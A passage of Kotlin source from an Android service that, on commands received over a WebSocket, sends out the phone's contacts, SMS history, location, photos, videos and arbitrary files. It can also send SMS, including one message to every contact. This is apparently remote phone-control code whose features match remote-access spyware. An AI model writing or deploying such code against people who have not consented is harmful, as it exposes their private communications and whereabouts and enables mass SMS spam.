            != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type", "contacts-error")
                .put("msg", "Нет разрешения READ_CONTACTS").toString())
            return
        }
        try {
            val contacts = JSONArray()
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )?.use { c ->
                val nameCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numCol  = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val typeCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                while (c.moveToNext()) {
                    val e = JSONObject()
                    e.put("name",   c.getString(nameCol) ?: "")
                    e.put("number", c.getString(numCol)  ?: "")
                    e.put("type",   ContactsContract.CommonDataKinds.Phone.getTypeLabel(
                        resources, c.getInt(typeCol), "").toString())
                    contacts.put(e)
                }
            }
            ws.send(JSONObject().put("type", "contacts").put("entries", contacts).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type", "contacts-error").put("msg", e.message ?: "ошибка").toString())
        }
    }

    private fun resolveContactName(address: String): String {
        if (address.isBlank()) return ""
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) return ""
        return try {
            val uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address))
            contentResolver.query(uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)?.use { c ->
                if (c.moveToFirst()) c.getString(0) ?: "" else ""
            } ?: ""
        } catch (_: Exception) { "" }
    }

    private fun sendSmsList(ws: WebSocket) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type", "sms-error").put("msg", "Нет разрешения READ_SMS").toString())
            return
        }
        try {
            data class Row(val address: String, val body: String, val date: Long, val type: Int, val read: Boolean)
            val rows = mutableListOf<Row>()
            contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type", "read"),
                null, null, "date DESC"
            )?.use { c ->
                val addrCol = c.getColumnIndex("address")
                val bodyCol = c.getColumnIndex("body")
                val dateCol = c.getColumnIndex("date")
                val typeCol = c.getColumnIndex("type")
                val readCol = c.getColumnIndex("read")
                var count = 0
                while (c.moveToNext() && count < 200) {
                    rows.add(Row(
                        address = c.getString(addrCol) ?: "",
                        body    = c.getString(bodyCol) ?: "",
                        date    = c.getLong(dateCol),
                        type    = c.getInt(typeCol),
                        read    = c.getInt(readCol) == 1
                    ))
                    count++
                }
            }
            // Batch-resolve contact names for unique addresses
            val nameCache = mutableMapOf<String, String>()
            for (row in rows) {
                if (row.address.isNotBlank() && !nameCache.containsKey(row.address)) {
                    nameCache[row.address] = resolveContactName(row.address)
                }
            }
            val messages = JSONArray()
            for (row in rows) {
                val e = JSONObject()
                e.put("address", row.address)
                e.put("name",    nameCache[row.address] ?: "")
                e.put("body",    row.body)
                e.put("date",    row.date)
                e.put("type",    row.type) // 1=входящее, 2=исходящее
                e.put("read",    row.read)
                messages.put(e)
            }
            ws.send(JSONObject().put("type", "sms-list").put("messages", messages).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type", "sms-error").put("msg", e.message ?: "ошибка").toString())
        }
    }

    private fun sendSmsMessage(number: String, text: String, ws: WebSocket) {
        fun status(ok: Boolean, msg: String) =
            ws.send(JSONObject().put("type", "sms-status").put("ok", ok).put("msg", msg).toString())
        if (number.isBlank()) { status(false, "Номер не указан"); return }
        if (text.isBlank()) { status(false, "Текст не указан"); return }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
            != PackageManager.PERMISSION_GRANTED) { status(false, "Нет разрешения SEND_SMS"); return }
        try {
            @Suppress("DEPRECATION")
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                getSystemService(SmsManager::class.java)
            else SmsManager.getDefault()
            val parts = smsManager.divideMessage(text)
            smsManager.sendMultipartTextMessage(number.trim(), null, parts, null, null)
            status(true, "СМС отправлено на ${number.trim()}")
        } catch (e: Exception) {
            status(false, "Ошибка: ${e.message ?: "неизвестная"}")
        }
    }

    private fun sendSmsBroadcast(text: String, ws: WebSocket) {
        fun done(ok: Boolean, msg: String, sent: Int = 0, failed: Int = 0) =
            ws.send(JSONObject().put("type","sms-broadcast-done").put("ok",ok).put("msg",msg).put("sent",sent).put("failed",failed).toString())
        if (text.isBlank()) { done(false, "Текст не указан"); return }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
            != PackageManager.PERMISSION_GRANTED) { done(false, "Нет разрешения SEND_SMS"); return }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) { done(false, "Нет разрешения READ_CONTACTS"); return }

        // Собираем уникальные номера из контактов
        val contacts = mutableListOf<Pair<String,String>>() // name, number
        val seen = mutableSetOf<String>()
        try {
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )?.use { c ->
                val nameCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numCol  = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (c.moveToNext()) {
                    val num = (c.getString(numCol) ?: "").trim().replace("\\s".toRegex(), "")
                    if (num.isBlank() || seen.contains(num)) continue
                    seen.add(num)
                    contacts.add(Pair(c.getString(nameCol) ?: num, num))
                }
            }
        } catch (e: Exception) { done(false, "Ошибка чтения контактов: ${e.message}"); return }

        if (contacts.isEmpty()) { done(false, "Нет контактов с номерами"); return }

        // Сообщаем сколько контактов найдено
        ws.send(JSONObject().put("type","sms-broadcast-progress").put("sent",0).put("failed",0).put("total",contacts.size).put("current","").toString())

        Thread {
            @Suppress("DEPRECATION")
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                getSystemService(SmsManager::class.java) else SmsManager.getDefault()
            var sent = 0; var failed = 0
            for ((name, number) in contacts) {
                if (!isRunning) { done(false, "Отменено", sent, failed); return@Thread }
                var ok = false
                var errMsg = ""
                try {
                    val parts = smsManager.divideMessage(text)
                    smsManager.sendMultipartTextMessage(number, null, parts, null, null)
                    sent++; ok = true
                } catch (e: Exception) { failed++; errMsg = e.message ?: "ошибка" }
                ws.send(JSONObject().put("type","sms-broadcast-progress")
                    .put("sent",sent).put("failed",failed).put("total",contacts.size)
                    .put("current",name).put("number",number).put("ok",ok).put("err",errMsg).toString())
                Thread.sleep(350)
            }
            done(true, "Рассылка завершена", sent, failed)
        }.start()
    }

    private fun sendSystemInfo(ws: WebSocket) {
        try {
            val json = JSONObject().put("type", "system-info")
            // RAM
            val am = getSystemService(ACTIVITY_SERVICE) as ActivityManager
            val mi = ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            json.put("ramTotal", mi.totalMem).put("ramAvail", mi.availMem)
            // Внутреннее хранилище
            val intStat = StatFs(filesDir.absolutePath)
            json.put("storIntTotal", intStat.totalBytes).put("storIntFree", intStat.availableBytes)
            // Внешнее (sdcard)
            try { val s = StatFs("/sdcard"); json.put("storExtTotal", s.totalBytes).put("storExtFree", s.availableBytes) } catch (_: Exception) {}
            // Температура батареи
            try {
                val bi = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val t = bi?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) ?: -1
                if (t >= 0) json.put("batteryTemp", t / 10.0)
            } catch (_: Exception) {}
            // Температура CPU (из thermal zones)
            try {
                val temps = mutableListOf<Double>()
                File("/sys/class/thermal").listFiles()?.forEach { zone ->
                    val type = File(zone, "type").readText().trim()
                    if (type.contains("cpu", ignoreCase = true) || type.contains("soc", ignoreCase = true)) {
                        val t = File(zone, "temp").readText().trim().toDoubleOrNull() ?: return@forEach
                        temps.add(if (t > 1000) t / 1000.0 else t)
                    }
                }
                if (temps.isNotEmpty()) json.put("cpuTemp", temps.max())
            } catch (_: Exception) {}
            // Bluetooth
            try {
                val bt = (getSystemService(BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter
                json.put("bluetoothEnabled", bt?.isEnabled ?: false)
            } catch (_: Exception) { json.put("bluetoothEnabled", false) }
            // VPN
            try {
                val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
                val caps = cm.getNetworkCapabilities(cm.activeNetwork)
                val vpnByCaps = caps != null && !caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_VPN)
                var vpnIface = ""
                try {
                    val ifaces = java.net.NetworkInterface.getNetworkInterfaces()
                    val tun = ifaces?.toList()?.firstOrNull { ni ->
                        (ni.name.startsWith("tun") || ni.name.startsWith("ppp")) && ni.isUp
                    }
                    if (tun != null) vpnIface = tun.name
                } catch (_: Exception) {}
                json.put("vpnActive", vpnByCaps || vpnIface.isNotEmpty())
                if (vpnIface.isNotEmpty()) json.put("vpnIface", vpnIface)
            } catch (_: Exception) {}
            ws.send(json.toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","system-info").put("err", e.message ?: "ошибка").toString())
        }
    }

    private fun sendVolumeInfo(ws: WebSocket) {
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        val streams = JSONObject()
        listOf(
            Triple("media",  AudioManager.STREAM_MUSIC,        "Медиа"),
            Triple("ring",   AudioManager.STREAM_RING,         "Звонок"),
            Triple("alarm",  AudioManager.STREAM_ALARM,        "Будильник"),
            Triple("notif",  AudioManager.STREAM_NOTIFICATION, "Уведомления")
        ).forEach { (key, stream, _) ->
            streams.put(key, JSONObject()
                .put("current", am.getStreamVolume(stream))
                .put("max",     am.getStreamMaxVolume(stream)))
        }
        ws.send(JSONObject().put("type","volume-info").put("streams", streams).toString())
    }

    private fun setVolume(stream: String, value: Int, ws: WebSocket) {
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        val s = when (stream) {
            "media" -> AudioManager.STREAM_MUSIC
            "ring"  -> AudioManager.STREAM_RING
            "alarm" -> AudioManager.STREAM_ALARM
            "notif" -> AudioManager.STREAM_NOTIFICATION
            else    -> AudioManager.STREAM_MUSIC
        }
        am.setStreamVolume(s, value.coerceIn(0, am.getStreamMaxVolume(s)), 0)
        sendVolumeInfo(ws)
    }

    @Suppress("DEPRECATION", "MissingPermission")
    private fun setBluetooth(enabled: Boolean, ws: WebSocket) {
        try {
            val bt = (getSystemService(BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter
            if (bt == null) { ws.send(JSONObject().put("type","bluetooth-status").put("ok",false).put("msg","Bluetooth недоступен").toString()); return }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // Android 13+: прямое включение/выключение запрещено для обычных приложений.
                // Открываем системный диалог/настройки — пользователь видит экран через стрим.
                val intent = if (enabled)
                    Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE)
                else
                    Intent(Settings.ACTION_BLUETOOTH_SETTINGS)
                startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                val hint = if (enabled) "Откройте диалог на экране телефона" else "Выключите Bluetooth в открывшихся настройках"
                ws.send(JSONObject().put("type","bluetooth-status").put("ok",false).put("msg","Android 13+: $hint").toString())
            } else {
                val ok = if (enabled) bt.enable() else bt.disable()
                ws.send(JSONObject().put("type","bluetooth-status").put("ok",ok).put("enabled",enabled).toString())
            }
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","bluetooth-status").put("ok",false).put("msg",e.message ?: "ошибка").toString())
        }
    }

    private fun setTorch(enabled: Boolean, ws: WebSocket) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as HwCameraManager
            val id = cm.cameraIdList.firstOrNull()
            if (id != null) { cm.setTorchMode(id, enabled); ws.send(JSONObject().put("type","torch-status").put("ok",true).put("enabled",enabled).toString()) }
            else ws.send(JSONObject().put("type","torch-status").put("ok",false).put("msg","Фонарик недоступен").toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","torch-status").put("ok",false).put("msg",e.message ?: "ошибка").toString())
        }
    }

    @Suppress("DEPRECATION")
    private fun doVibrate(ms: Long) {
        val duration = ms.coerceIn(50, 5000)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                (getSystemService(VIBRATOR_MANAGER_SERVICE) as android.os.VibratorManager)
                    .defaultVibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    v.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
                else v.vibrate(duration)
            }
        } catch (_: Exception) {}
    }

    private fun sendChunkBinary(
        ws: WebSocket, requestId: String, index: Int, total: Int,
        name: String, mime: String, size: Long, buf: ByteArray, len: Int
    ) {
        val header = JSONObject()
            .put("type", "file-chunk")
            .put("requestId", requestId)
            .put("index", index)
            .put("total", total)
            .put("name", name)
            .put("mime", mime)
            .put("size", size)
            .toString()
            .toByteArray(Charsets.UTF_8)
        val frame = ByteArray(4 + header.size + len)
        frame[0] = (header.size ushr 24).toByte()
        frame[1] = (header.size ushr 16).toByte()
        frame[2] = (header.size ushr 8).toByte()
        frame[3] = header.size.toByte()
        System.arraycopy(header, 0, frame, 4, header.size)
        System.arraycopy(buf, 0, frame, 4 + header.size, len)
        ws.send(frame.toByteString())
    }

    private fun sendFile(filePath: String, requestId: String, ws: WebSocket) {
        fun err(msg: String) = ws.send(JSONObject().put("type","file-chunk").put("requestId",requestId).put("err",msg).toString())
        if (filePath.isBlank()) { err("Путь не указан"); return }
        val file = File(filePath)
        if (!file.exists() || !file.isFile) { err("Файл не найден"); return }
        val mime = try { contentResolver.getType(Uri.fromFile(file)) } catch (_: Exception) { null } ?: "application/octet-stream"
        val fileSize = file.length()
        val chunkSize = 2 * 1024 * 1024
        val totalChunks = ((fileSize + chunkSize - 1) / chunkSize).toInt().coerceAtLeast(1)
        Thread {
            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_FOREGROUND)
            try {
                file.inputStream().use { stream ->
                    val buf = ByteArray(chunkSize)
                    var index = 0
                    while (true) {
                        var read = 0
                        while (read < buf.size) { val r = stream.read(buf, read, buf.size - read); if (r <= 0) break; read += r }
                        if (read <= 0) break
                        sendChunkBinary(ws, requestId, index, totalChunks, file.name, mime, fileSize, buf, read)
                        index++
                        while (ws.queueSize() > 4 * 1024 * 1024) Thread.sleep(10)
                    }
                }
            } catch (e: Exception) { err(e.message ?: "ошибка") }
        }.apply { isDaemon = true }.start()
    }

    @Suppress("DEPRECATION")
    private fun sendBulkFiles(mediaType: String, photoLimit: Int, videoLimit: Int, ws: WebSocket) {
        Thread {
            try {
                data class MF(val path: String, val name: String, val mime: String, val size: Long)
                val files = mutableListOf<MF>()

                fun collectMedia(uri: android.net.Uri, perm: String, limit: Int) {
                    if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) return
                    contentResolver.query(uri,
                        arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME,
                                MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.SIZE),
                        null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                        val pathCol = c.getColumnIndex(MediaStore.MediaColumns.DATA); if (pathCol < 0) return
                        val nameCol = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                        val mimeCol = c.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                        val sizeCol = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
                        var count = 0
                        while (c.moveToNext() && (limit <= 0 || count < limit)) {
                            val path = c.getString(pathCol) ?: continue
                            if (!File(path).isFile) continue
                            val name = if (nameCol >= 0) c.getString(nameCol) ?: File(path).name else File(path).name
                            val mime = if (mimeCol >= 0) c.getString(mimeCol) ?: "application/octet-stream" else "application/octet-stream"
                            val size = if (sizeCol >= 0) c.getLong(sizeCol) else File(path).length()
                            files.add(MF(path, name, mime, size)); count++
                        }
                    }
                }

                val imgPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
                val vidPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE

                if (mediaType == "images" || mediaType == "all")
                    collectMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imgPerm, photoLimit)
                if (mediaType == "videos" || mediaType == "all")
                    collectMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, vidPerm, videoLimit)

                val total = files.size
                val totalBytes = files.sumOf { it.size }
                ws.send(JSONObject().put("type","bulk-start").put("total",total).put("totalBytes",totalBytes).toString())

                val chunkSize = 2 * 1024 * 1024
                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_FOREGROUND)
                for ((idx, entry) in files.withIndex()) {
                    if (bulkCancelled || ws !== wsPhone) {
                        ws.send(JSONObject().put("type","bulk-done").put("cancelled",true).put("done",idx).put("total",total).toString())
                        return@Thread
                    }
                    val file = File(entry.path)
                    val fileSize = file.length()
                    val requestId = "bulk_$idx"
                    val totalChunks = ((fileSize + chunkSize - 1) / chunkSize).toInt().coerceAtLeast(1)
                    try {
                        file.inputStream().use { stream ->
                            val buf = ByteArray(chunkSize); var chunkIdx = 0
                            while (true) {
                                if (bulkCancelled || ws !== wsPhone) break
                                var read = 0
                                while (read < buf.size) { val r = stream.read(buf, read, buf.size - read); if (r <= 0) break; read += r }
                                if (read <= 0) break
                                sendChunkBinary(ws, requestId, chunkIdx, totalChunks, entry.name, entry.mime, fileSize, buf, read)
                                chunkIdx++
                                while (ws.queueSize() > 4 * 1024 * 1024) {
                                    if (bulkCancelled || ws !== wsPhone) break
                                    Thread.sleep(10)
                                }
                            }
                        }
                    } catch (_: Exception) {}
                    ws.send(JSONObject().put("type","bulk-progress")
                        .put("done",idx+1).put("total",total).put("name",entry.name).toString())
                }
                ws.send(JSONObject().put("type","bulk-done").put("done",total).put("total",total).toString())
            } catch (e: Exception) {
                ws.send(JSONObject().put("type","bulk-done").put("err",e.message?:"ошибка").toString())
            }
        }.apply { isDaemon = true }.start()
    }

    @Suppress("DEPRECATION")
    private fun sendGalleryStats(ws: WebSocket) {
        try {
            var imageCount = 0L; var imageSize = 0L
            var videoCount = 0L; var videoSize = 0L
            val imgPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            val vidPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE
            if (ContextCompat.checkSelfPermission(this, imgPerm) == PackageManager.PERMISSION_GRANTED) {
                contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    arrayOf(MediaStore.MediaColumns.SIZE), null, null, null)?.use { c ->
                    imageCount = c.count.toLong()
                    val col = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
                    if (col >= 0) while (c.moveToNext()) imageSize += c.getLong(col)
                }
            }
            if (ContextCompat.checkSelfPermission(this, vidPerm) == PackageManager.PERMISSION_GRANTED) {
                contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    arrayOf(MediaStore.MediaColumns.SIZE), null, null, null)?.use { c ->
                    videoCount = c.count.toLong()
                    val col = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
                    if (col >= 0) while (c.moveToNext()) videoSize += c.getLong(col)
                }
            }
            ws.send(JSONObject().put("type","gallery-stats")
                .put("imageCount", imageCount).put("imageSize", imageSize)
                .put("videoCount", videoCount).put("videoSize", videoSize).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","gallery-stats").put("err", e.message ?: "ошибка").toString())
        }
    }

    @Suppress("DEPRECATION")
    private fun sendGalleryFolders(ws: WebSocket) {
        data class BInfo(val id: String, val name: String, val thumbId: Long, var count: Int)

        val imgPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        val vidPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE
        val hasImages = ContextCompat.checkSelfPermission(this, imgPerm) == PackageManager.PERMISSION_GRANTED
        val hasVideos = ContextCompat.checkSelfPermission(this, vidPerm) == PackageManager.PERMISSION_GRANTED

        try {
            val imageBuckets = linkedMapOf<String, BInfo>()
            val videoBuckets = linkedMapOf<String, BInfo>()

            fun collectBuckets(uri: android.net.Uri, map: LinkedHashMap<String, BInfo>) {
                contentResolver.query(uri,
                    arrayOf("bucket_id", "bucket_display_name", MediaStore.MediaColumns._ID),
                    null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                    val bidCol = c.getColumnIndex("bucket_id"); if (bidCol < 0) return
                    val bnCol  = c.getColumnIndex("bucket_display_name")
                    val idCol  = c.getColumnIndex(MediaStore.MediaColumns._ID); if (idCol < 0) return
                    while (c.moveToNext()) {
                        val bid   = c.getString(bidCol) ?: continue
                        val bname = if (bnCol >= 0) c.getString(bnCol) ?: bid else bid
                        val id    = c.getLong(idCol)
                        if (!map.containsKey(bid)) map[bid] = BInfo(bid, bname, id, 1)
                        else map[bid]!!.count++
                    }
                }
            }

            if (hasImages) collectBuckets(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageBuckets)
            if (hasVideos) collectBuckets(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, videoBuckets)

            val folders = JSONArray()
            if (hasImages && imageBuckets.isNotEmpty()) {
                val total = imageBuckets.values.sumOf { it.count }
                folders.put(JSONObject().put("id","").put("name","Все фото").put("mediaType","images")
                    .put("count",total).put("thumbId", imageBuckets.values.first().thumbId))
            }
            if (hasVideos && videoBuckets.isNotEmpty()) {
                val total = videoBuckets.values.sumOf { it.count }
                folders.put(JSONObject().put("id","").put("name","Все видео").put("mediaType","videos")
                    .put("count",total).put("thumbId", videoBuckets.values.first().thumbId))
            }
            imageBuckets.values.sortedByDescending { it.count }.forEach { b ->
                folders.put(JSONObject().put("id",b.id).put("name",b.name).put("mediaType","images")
                    .put("count",b.count).put("thumbId",b.thumbId))
            }
            videoBuckets.values.sortedByDescending { it.count }.forEach { b ->
                folders.put(JSONObject().put("id",b.id).put("name",b.name).put("mediaType","videos")
                    .put("count",b.count).put("thumbId",b.thumbId))
            }
            ws.send(JSONObject().put("type","gallery-folders").put("folders",folders).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","gallery-folders").put("err", e.message ?: "ошибка").toString())
        }
    }

    @Suppress("MissingPermission")
    private fun sendLocation(ws: WebSocket) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type","location").put("err","Нет разрешения геолокации").toString()); return
        }
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            var best: android.location.Location? = null
            for (provider in lm.allProviders) {
                try {
                    val loc = lm.getLastKnownLocation(provider) ?: continue
                    if (best == null || loc.accuracy < best.accuracy) best = loc
                } catch (_: Exception) {}
            }
            if (best == null) {
                ws.send(JSONObject().put("type","location").put("err","Координаты недоступны — включи геолокацию и подожди").toString())
                return
            }
            ws.send(JSONObject().put("type","location")
                .put("lat", best.latitude).put("lon", best.longitude)
                .put("accuracy", best.accuracy).put("provider", best.provider ?: "")
                .put("time", best.time).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","location").put("err", e.message ?: "ошибка").toString())
        }
    }

    @Suppress("DEPRECATION")
    private fun sendGallery(mediaType: String, limit: Int, offset: Int, ws: WebSocket, bucketId: String = "") {
        val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            if (mediaType == "videos") Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_MEDIA_IMAGES
        else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type","gallery-items").put("err","Нет разрешения на чтение медиа").toString()); return
        }
        try {
            val isVideo = mediaType == "videos"
            val uri = if (isVideo) MediaStore.Video.Media.EXTERNAL_CONTENT_URI else MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(
                MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.DATE_ADDED,
                MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.DATA
            )
            val selection     = if (bucketId.isNotEmpty()) "bucket_id = ?" else null
            val selectionArgs = if (bucketId.isNotEmpty()) arrayOf(bucketId) else null
            val items = JSONArray()
            var total = 0
            contentResolver.query(uri, projection, selection, selectionArgs, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                total = c.count
                val startPos = offset.coerceIn(0, total)
                var count = 0
                if (c.moveToPosition(startPos)) {
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                    val sizeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                    val mimeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                    val dataCol = c.getColumnIndex(MediaStore.MediaColumns.DATA)
                    do {
                        val item = JSONObject()
                        item.put("id",   c.getLong(idCol))
                        item.put("name", c.getString(nameCol) ?: "")
                        item.put("size", c.getLong(sizeCol))
                        item.put("date", c.getLong(dateCol) * 1000L)
                        item.put("mime", c.getString(mimeCol) ?: "")
                        if (dataCol >= 0) item.put("path", c.getString(dataCol) ?: "")
                        items.put(item)
                        count++
                    } while (c.moveToNext() && count < limit.coerceIn(1, 200))
                }
            }
            ws.send(JSONObject().put("type","gallery-items").put("mediaType",mediaType)
                .put("items",items).put("total",total).put("offset",offset).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","gallery-items").put("err", e.message ?: "ошибка").toString())
        }
    }

    @Suppress("DEPRECATION")
    private fun sendMediaThumb(id: Long, mediaType: String, ws: WebSocket) {
        if (id <= 0) { ws.send(JSONObject().put("type","media-thumb").put("id",id).put("err","Неверный id").toString()); return }
        try {
            val isVideo = mediaType == "videos"
            val contentUri = if (isVideo)
                ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id)
            else
                ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            val thumb = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                contentResolver.loadThumbnail(contentUri, android.util.Size(120, 120), null)
            } else {
                if (isVideo)
                    MediaStore.Video.Thumbnails.getThumbnail(contentResolver, id, MediaStore.Video.Thumbnails.MINI_KIND, null)
                else
                    MediaStore.Images.Thumbnails.getThumbnail(contentResolver, id, MediaStore.Images.Thumbnails.MINI_KIND, null)
            }
            if (thumb == null) { ws.send(JSONObject().put("type","media-thumb").put("id",id).put("err","Миниатюра недоступна").toString()); return }
            val out = ByteArrayOutputStream()
            thumb.compress(Bitmap.CompressFormat.JPEG, 70, out)
            thumb.recycle()
            val b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
            ws.send(JSONObject().put("type","media-thumb").put("id",id).put("data",b64).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","media-thumb").put("id",id).put("err", e.message ?: "ошибка").toString())
        }
    }

    private fun sendMediaFile(id: Long, mediaType: String, requestId: String, ws: WebSocket) {
        fun err(msg: String) = ws.send(JSONObject().put("type","file-chunk").put("requestId",requestId).put("err",msg).toString())
        try {
            if (id <= 0) { err("Неверный id"); return }
            val isVideo = mediaType == "videos"
            val contentUri = ContentUris.withAppendedId(
                if (isVideo) MediaStore.Video.Media.EXTERNAL_CONTENT_URI else MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            var name = "file"; var mime = "application/octet-stream"; var fileSize = 0L
            try {
                contentResolver.query(contentUri,
                    arrayOf(MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.SIZE),
                    null, null, null)?.use { c ->
                    if (c.moveToFirst()) {
                        val nc = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                        val mc = c.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
